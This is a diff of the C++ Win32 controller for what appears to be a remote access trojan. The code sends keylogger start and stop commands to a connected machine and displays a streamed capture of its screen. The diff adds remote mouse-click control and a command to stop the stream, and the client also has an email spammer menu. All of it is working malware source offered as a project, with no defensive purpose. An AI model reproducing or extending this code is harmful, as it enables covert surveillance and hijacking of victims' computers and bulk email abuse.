@@ -1,33 +1,6 @@
 #include "project_client.h"
 #include  "email.h"
 
-
-
-map<string, CLIENT_MESSAGES> MESSAGEMAP;
-
-struct sockaddr_in clientsocket;
-SOCKET sa;
-stringstream KEYLOG_STREAM;
-char client_buffer[BUFFER_SZ];
-string client_operator, client_operand;
-string keylog = "Keylog window:\n";
-
-/*  Make the class name into a global variable  */
-char szClassName[ ] = "KeyClient";
-HWND g_hToolbar = NULL;
-
-        int bitcounter = 0, framesdrawn = 0;
-        bool pkt_complete = false;
-
-
-        unsigned char *bitmapbuf, *bitmapbuf_compressed;
-
-        IMAGE_PKT_HEADER hdrpkt;
-        BITMAPINFOHEADER bi;
-        HDC handle_WindowDC;
-        PAINTSTRUCT paintstruct;
-
-
 int WINAPI WinMain (HINSTANCE hThisInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpszArgument,
@@ -88,8 +61,8 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
            WS_OVERLAPPEDWINDOW|WS_BORDER, /* default window */
            CW_USEDEFAULT,       /* Windows decides the position */
            CW_USEDEFAULT,       /* where the window ends up on the screen */
-           650,                 /* The programs width */
-           480,                 /* and height in pixels */
+           850,                 /* The programs width */
+           595,                 /* and height in pixels */
            HWND_DESKTOP,        /* The window is a child-window to desktop */
            NULL,                /* No menu */
            hThisInstance,       /* Program Instance handler */
@@ -113,14 +86,12 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
     return messages.wParam;
 }
 
-
 /*  This function is called by the Windows function DispatchMessage()  */
 
-LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
-{
+LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam){
 
-    switch (message)
-    {
+    switch (message){
+
        case WM_CREATE:{
 
             HINSTANCE hInstance = GetModuleHandle(NULL);
@@ -146,43 +117,19 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                 case FD_CLOSE:{
                      MessageBox(NULL, "ZOMG! The host disconnected for some odd reason!\nDid you kill the server?", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
                      SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Disconnected.");
-                }
-                break;
+                }break;
+
                 case FD_CONNECT:
                     //MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
                 break;
+
                 case FD_WRITE:
                     SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
                 break;
+
                 case FD_READ:{
 
-                    //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
-                    //Whenever the server gets a read message, parse the message into a operator/operand like the server
-                    //if the operator is  of Keylog or KG or whatever, then process it in a way which sends it to our KEY_LOG WINDOW
-                    //That way we can differentiate between statuses and Keylogwindow!
-                    //You can add other ways in which the server sends messages to client.
-                    //This can be a great chat client as well!
-
-                    //client_operator = "", client_operand = "";
-
-                       /* memset(&client_buffer[0], '\0', BUFFER_SZ);
-                        HandleError(recv(sa, client_buffer,  BUFFER_SZ, NULL));
-
-                         int forcount = 0;
-                         for (; client_buffer[forcount] != '>'; forcount++){
-                            client_operator += client_buffer[forcount];
-                         }
-
-                            //PARSE THE OPERAND
-                        forcount++;
-                        for (; client_buffer[forcount] != '<'; forcount++){
-                            client_operand += client_buffer[forcount];
-                        }
-
-                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);*/
-
                     PKT pkt;
-
                     recv(sa, (char*)&pkt, sizeof(PKT), 0);
 
                     client_operator.clear();
@@ -204,7 +151,7 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                             case BITMAPHDR:{
 
-
+                                pict_is_streaming = true;
 
                                 hdrpkt = *(IMAGE_PKT_HEADER *)pkt.data;
 
@@ -215,16 +162,13 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                                 stringstream ss;
                                 framesdrawn++;
-                                ss << "Stream Original Resolution: " << hdrpkt.origx << ", " << hdrpkt.origy
-                                   << " || Stretched to: 640, 360 || " <<  framesdrawn << " Frames drawn at 10 fps";
+                                ss << "Stream Orig. Resolution: " << hdrpkt.origx << ", " << hdrpkt.origy
+                                   << " || Stretched to: 640, 360 || " <<  framesdrawn << " Frames drawn 10 fps" << "Ratio: " << hdrpkt.screen_ratio;
                                 SetDlgItemText(hwnd, STREAM_STATUS, ss.str().c_str());
 
-                            }
-
-                            break;
+                            }break;
 
                             case BITMAPDATA:{
-
 
                                 for(int i = 0; i<4096 && bitcounter < hdrpkt.compressed_Size; i++){
 
@@ -232,13 +176,11 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                                     bitcounter++;
                                     //std::cout << "\n"<< bitcounter
                                 }
-                            }
 
-                            break;
+                            }break;
 
                             case BITMAPEND:{
-                                //MessageBox(NULL, NULL,
-                                   //        "Bitmapend", NULL);
+
                                 bitcounter = 0;
                                 pkt_complete = true;
 
@@ -247,10 +189,7 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                                 RedrawWindow(hwnd, NULL,NULL, RDW_INVALIDATE);
 
-
-
-                            }
-                            break;
+                            }break;
 
                             case STREAMPICTURE: //pic
                             break;
@@ -264,25 +203,17 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                 }
                 break;
-
             }
 
         }
 
         case WM_PAINT:{
 
-            //handle_WindowDC = BeginPaint(hwnd, &paintstruct);
-
-
-
-
-            //EndPaint(hwnd, &paintstruct);
-
             if (pkt_complete){
 
                 handle_WindowDC = BeginPaint(hwnd, &paintstruct);
 
-                    SetDIBitsToDevice(handle_WindowDC, 15, 30, 640, 360, 0, 0, 0, 360, bitmapbuf, (BITMAPINFO *)&bi, DIB_RGB_COLORS );
+                SetDIBitsToDevice(handle_WindowDC, 15, 30, 640, 360, 0, 0, 0, 360, bitmapbuf, (BITMAPINFO *)&bi, DIB_RGB_COLORS );
 
                 EndPaint(hwnd, &paintstruct);
                 ReleaseDC(hwnd, handle_WindowDC);
@@ -290,31 +221,42 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                 delete[] bitmapbuf;
                 delete[] bitmapbuf_compressed;
                 pkt_complete = false;
-                //MessageBox(NULL, "I am painting", NULL, NULL);
+
 
             }else return DefWindowProc (hwnd, message, wParam, lParam);
-        }
 
-        break;
+        }break;
 
-        case WM_COMMAND:
+        case WM_COMMAND:{
 
             switch(LOWORD(wParam)){
+
+                case STOP_STREAM:{
+
+                    //MessageBox(NULL,NULL,NULL,NULL);
+                    PKT pktstopstream;
+                    strncpy(pktstopstream.command, "STOPSTREAM", 11);
+                    memset(pktstopstream.data, 0, sizeof(pktstopstream.data));
+
+                    send(sa, (char *)&pktstopstream, sizeof(pktstopstream),0);
+
+                }break;
+
                 case CHK_KEYLOG:{
 
                     //If the button is already checked, then break out.
                     if (BST_CHECKED == IsDlgButtonChecked(hwnd, CHK_KEYLOG)){
+
                         break;
                     }
+
                     CheckDlgButton(hwnd, CHK_KEYLOG, BST_CHECKED);
                     CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_UNCHECKED);
                     PKT pktkey;
                     strncpy(pktkey.command, "KEYLOG\0", 7);
                     HandleError(send(sa, (char *)&pktkey, sizeof(pktkey), 0));
-                    //MessageBox(NULL, "Keylog", NULL, NULL);
 
-                }
-                break;
+                }break;
 
                 case STREAM_BUTTON:{
 
@@ -334,21 +276,21 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                     }
                     CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_CHECKED);
                     CheckDlgButton(hwnd, CHK_KEYLOG, BST_UNCHECKED);
-                    //MessageBox(NULL, "stop Keylog", NULL, NULL);
 
-                    //MessageBox(NULL,NULL,NULL,NULL);
                     PKT pktunkey;
                     strncpy(pktunkey.command, "STOPKEYLOG\0", 11);
                     HandleError(send(sa, (char *)&pktunkey, sizeof(pktunkey), 0));
 
-                }
-                break;
+                }break;
 
                 case MAIN_WINDOW_BUTTONMSG1:{
+
                     DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_MSGBOXTRIG), hwnd, MsgBoxTrigger);
+
                 }break;
 
                 case DISCONNECT_HOST:{
+
                     PKT pktdc;
                     strncpy(pktdc.command, "DISCONNECT\0", 11);
                     HandleError(send(sa, (char *)&pktdc, sizeof(pktdc), 0));
@@ -380,8 +322,6 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                         sa = socket(AF_INET, SOCK_STREAM, 0);
                         HandleError(sa);
-                        //HandleError(4);
-
 
                         clientsocket.sin_family = AF_INET;
                         clientsocket.sin_addr.s_addr = inet_addr(ipaddress.c_str());
@@ -394,24 +334,10 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                             break;
                         }else MessageBox(NULL, "Success! Client connected successfully!", "Success!", MB_OK | MB_ICONINFORMATION);
 
-                        //char client_buffer[500];
-
-                        //recv(sa, client_buffer, 500, 0);
-
-                        //send(sa, "MESSAGE2>", 20, 0);
-
-                        //send() directly? Or call a function()? Send a message?
-
-
                     delete []ipbuff;
                     delete []portbuff;
 
-
-
-
                 }break;
-
-
 
                 case ID_FILE_EXIT:
                       PostQuitMessage (0);
@@ -421,20 +347,15 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                     int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ABOUT),hwnd, AboutDlgProc);
 
-                    if (ret == IDOK){
+                    switch(ret){
 
-                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);
+                        case IDOK:
 
-                    }else if(ret == IDCANCEL){
+                        case IDCANCEL:  MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);
+                        break;
 
-                        MessageBox(hwnd, "Thanks for noticing the author!", "ty", MB_OK | MB_ICONINFORMATION);
-
-                    }else if(ret == -1){
-
-                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);
-
+                        case -1: MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);
                     }
-
 
                 }
                 break;
@@ -442,63 +363,76 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                 case IDM_CONTACT:{
 
                          HandleError(DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_EMAILME),hwnd, EmailMeDlg));
-
-
                 }
                 break;
 
                 case IDM_EMAIL_SPAMMER:
-
                     int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_ESPAMMER),hwnd, ESpamDlg);
 
                     if(ret == -1){
-
                         HandleError(MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION));
-
-                    }
-
-                    break;
+                    }break;
 
             }
+        }break;
 
-        break;
+        case WM_RBUTTONDOWN:{
+
+            right_click = true;
+            //Falls through to WM_LBUTTONDWN
+            //Determines the ternary operator result.
+        }
+        case WM_LBUTTONDOWN:{
+
+            //std::cout <<"\nx: " << GET_X_LPARAM(lParam) << "\ny: " << GET_Y_LPARAM(lParam);
+           tagPOINT point;
+
+            point.x = GET_X_LPARAM(lParam);
+            point.y = GET_Y_LPARAM(lParam);
+
+           if(pict_is_streaming && PtInRect(&click_rectangle, point)){
+
+                    int x, y;
+                    x = 2.5*(point.x - 15);
+                    y = 2.5*(point.y - 30);
+
+                PKT click_command;
+                strncpy(click_command.command, "MOVMOUSECLK", 11);
+                //MessageBox(NULL,NULL,NULL,NULL);
+                memset(click_command.data, 0, sizeof(click_command.data));
+                //Pack integers into unsigned char array
+
+                click_command.data[0] = (0xff000000 & x) >> 24;
+                click_command.data[1] = (0x00ff0000 & x) >> 16;
+                click_command.data[2] = (0x0000ff00 & x) >> 8;
+                click_command.data[3] = x;
+
+                click_command.data[4] = (0xff000000 & y) >> 24;
+                click_command.data[5] = (0x00ff0000 & y) >> 16;
+                click_command.data[6] = (0x0000ff00 & y) >> 8;
+                click_command.data[7] = y;
+
+                click_command.data[8] = (unsigned char)((right_click == true) ? 'R' : 'L'); //'L' is for left, 'R' is for right
+
+                send(sa, (char *)&click_command, sizeof(click_command), 0);
+                right_click = false;
+            }
+
+        }break;
+
         case WM_DESTROY:{
             HandleError(WSACleanup());
             PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
 
-        }
+        }break;
 
-        break;
         default:                      /* for messages that we don't deal with */
             return DefWindowProc(hwnd, message, wParam, lParam);
     }
-        return 0;
-}
-
-
-
-//http://us.generation-nt.com/answer/getdlgitemfloat-help-26637032.html
-//Grab a floating point string from the form. Used in the email spammer.
-float GetDlgItemFloat(HWND hDlg, int id){
-
-    TCHAR *pEnd;
-    TCHAR szItemText[20];
-    GetDlgItemText(hDlg, id, szItemText, 20);
-
-    return (float)strtod(szItemText, &pEnd);
-}
-
-
-int HandleError(int error){
-
-   if ( error < 0){
-
-        stringstream ss;
-        ss <<"ErrorC: " << WSAGetLastError() << " From WSA/GetLastError()!";
-        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
-
-    }else return 0;
 
     return 0;
+
 }
+
+
 
